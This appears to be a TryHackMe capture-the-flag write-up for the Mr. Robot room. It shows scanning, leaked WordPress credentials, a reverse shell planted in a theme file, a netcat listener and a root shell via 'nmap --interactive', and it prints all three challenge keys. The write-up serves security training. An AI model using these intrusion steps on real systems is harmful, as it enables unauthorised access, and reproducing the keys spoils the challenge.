# Mr. Robot CTF – TryHackMe Writeup

## Overview

This report documents the compromise of the **Mr. Robot CTF** machine through web enumeration, credential discovery, WordPress exploitation, and privilege escalation via a vulnerable SUID-enabled Nmap binary.

The objective was to identify exposed services, gain initial access to the target system, escalate privileges, and recover all three challenge keys.

---

# Target Information

| Field | Value |
|---------|---------|
| Target IP | 10.49.148.221 |
| Platform | TryHackMe |
| Room Name | Mr. Robot CTF |

---

# Executive Summary

During the assessment, multiple weaknesses were identified that allowed progression from unauthenticated access to full root compromise.

The attack chain involved:

1. Enumerating the web application.
2. Discovering sensitive files through `robots.txt`.
3. Recovering exposed credentials.
4. Obtaining administrative access to WordPress.
5. Uploading a PHP reverse shell through the theme editor.
6. Gaining a shell as the `daemon` user.
7. Enumerating SUID binaries.
8. Exploiting a vulnerable SUID-enabled Nmap binary.
9. Escalating privileges to root.
10. Recovering all three challenge keys.

---

# Enumeration

## Connectivity Check

```bash
ping 10.49.148.221
```
```bash
PING 10.49.148.221 (10.49.148.221) 56(84) bytes of data.
64 bytes from 10.49.148.221: icmp_seq=1 ttl=62 time=272 ms
64 bytes from 10.49.148.221: icmp_seq=2 ttl=62 time=182 ms
64 bytes from 10.49.148.221: icmp_seq=3 ttl=62 time=174 ms
```

The target responded successfully, confirming that the machine was reachable, and ttl=62 represents that most probably it's a linux machine.

---

## Nmap Scan

```bash
nmap 10.49.148.221
```

### Results

| Port | State | Service |
|------|--------|---------|
| 22/tcp | Closed | SSH |
| 80/tcp | Open | HTTP |
| 443/tcp | Closed | HTTPS |

Since HTTP was the primary accessible service, web enumeration became the next step.

---

# Web Enumeration

## Gobuster Scan

```bash
gobuster dir -u http://10.49.148.221 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Interesting Findings

| Path | Status |
|--------|--------|
| /blog | 301 |
| /admin | 301 |
| /dashboard | 302 |
| /login | 302 |
| /robots | 200 |
| /license | 200 |
| /intro | 200 |
| /phpmyadmin | 403 |

The most interesting discoveries were:

```text
/robots.txt
/license
/login.php
```

---

# First Key

Browsing to:

```text
/robots.txt
```

revealed:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Accessing:

```text
/key-1-of-3.txt
```

returned the first key:

```text
073403c8a58a1f80d943455fb30724b9
```

### Key 1

```text
073403c8a58a1f80d943455fb30724b9
```

Further enumeration led to:

```text
/license
```

Near the bottom of the page the following Base64 string was found:

```text
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoding it:

```bash
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```

Output:

```text
elliot:ER28-0652
```

### Credentials

```text
Username: elliot
Password: ER28-0652
```

---

# WordPress Administrator Access

Using the discovered credentials on:

```text
/login
```

after login got rediricted to:
```text
/wp-login.php
```

successfully granted administrative access to the WordPress dashboard.

Having administrator privileges on WordPress is extremely dangerous because administrators can modify theme files and execute arbitrary PHP code on the server.

---

# Remote Code Execution

Navigate to:

```text
Appearance → Editor
```

Select:

```text
404.php
```

The `404.php` template is executed whenever a non-existent page is requested.

A PHP reverse shell was inserted into the file and the changes were saved.

To trigger the payload:

```text
http://10.49.148.221/404.php
```

or any non-existent page was visited.

---

# Initial Shell

Start a listener:

```bash
nc -lvnp 1234
```

A reverse shell connected back:

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Verify access:

```bash
whoami
```

Output:

```text
daemon
```

Initial access was obtained as the low-privileged user:

```text
daemon
```

---

# Local Enumeration

Exploring user directories:

```bash
cd /home
ls
```

Output:

```text
robot
ubuntu
```

Moving into the robot user's directory:

```bash
cd /home/robot
ls
```

Output:

```text
key-2-of-3.txt
password.raw-md5
```

Attempting to read the second key:

```bash
cat key-2-of-3.txt
```

Result:

```text
Permission denied
```

The daemon user did not have sufficient privileges.

---

# Privilege Escalation Enumeration

Searching for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Interesting result:

```text
/usr/local/bin/nmap
```

---

# Understanding the Vulnerability

SUID (Set User ID) allows a program to run with the permissions of its owner rather than the current user.

Normally:

```text
daemon → executes program → daemon privileges
```

With SUID:

```text
daemon → executes SUID program → owner's privileges
```

In this case:

```text
/usr/local/bin/nmap
```

was owned by root and had the SUID bit set.

Older versions of Nmap contain an interactive mode that allows execution of operating system commands.

This combination leads directly to privilege escalation.

---

# Privilege Escalation via Nmap

Launch interactive mode:

```bash
nmap --interactive
```

Inside interactive mode:

```bash
!/bin/sh
```

This spawned a root shell.

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

Root access achieved.

---

# Second Key

Now that root access was obtained:

```bash
cat /home/robot/key-2-of-3.txt
```

Output:

```text
822c73956184f694993bede3eb39f959
```

### Key 2

```text
822c73956184f694993bede3eb39f959
```

---

# Third Key

Read the final key:

```bash
cat /root/key-3-of-3.txt
```

Output:

```text
04787ddef27c3dee1ee161b21670b4e4
```

### Key 3

```text
04787ddef27c3dee1ee161b21670b4e4
```

---

# Attack Path Summary

1. Enumerated the web server using Gobuster.
2. Discovered `robots.txt`.
3. Retrieved Key 1 and the `fsocity.dic` wordlist.
4. Enumerated the `license` page.
5. Discovered Base64-encoded credentials.
6. Decoded credentials for the user **elliot**.
7. Logged into the WordPress administration panel.
8. Modified `404.php` to execute a PHP reverse shell.
9. Triggered the payload and obtained a shell as **daemon**.
10. Enumerated SUID binaries.
11. Identified a vulnerable SUID-enabled Nmap binary.
12. Used Nmap interactive mode to spawn a root shell.
13. Retrieved Key 2 and Key 3.

---

# Findings & Vulnerabilities

| ID | Finding | Severity |
|----|----------|----------|
| F-01 | Sensitive files exposed through `robots.txt` | Medium |
| F-02 | Credentials disclosed via Base64-encoded data on the website on `/license` page | High |
| F-03 | WordPress administrator access obtained | High |
| F-04 | Arbitrary code execution through theme editor | Critical |
| F-05 | SUID-enabled Nmap binary allowing privilege escalation | Critical |

---

# Tools Used

### Enumeration

- Nmap
- Gobuster

### Initial Access

- PHP Reverse Shell
- Netcat

### Privilege Escalation

- GTFOBins
- Linux SUID

---

# Keys Obtained

| Key | Value |
|------|--------|
| Key 1 | 073403c8a58a1f80d943455fb30724b9 |
| Key 2 | 822c73956184f694993bede3eb39f959 |
| Key 3 | 04787ddef27c3dee1ee161b21670b4e4 |

---

# Conclusion

The Mr. Robot CTF demonstrated how exposed information, weak credential handling, and insecure WordPress administration can lead to remote code execution. After gaining access through the WordPress dashboard, further enumeration revealed a vulnerable SUID-enabled Nmap binary, which was abused to escalate privileges and obtain root access. This room provided hands-on experience with web enumeration, credential discovery, WordPress exploitation, SUID abuse, and Linux privilege escalation.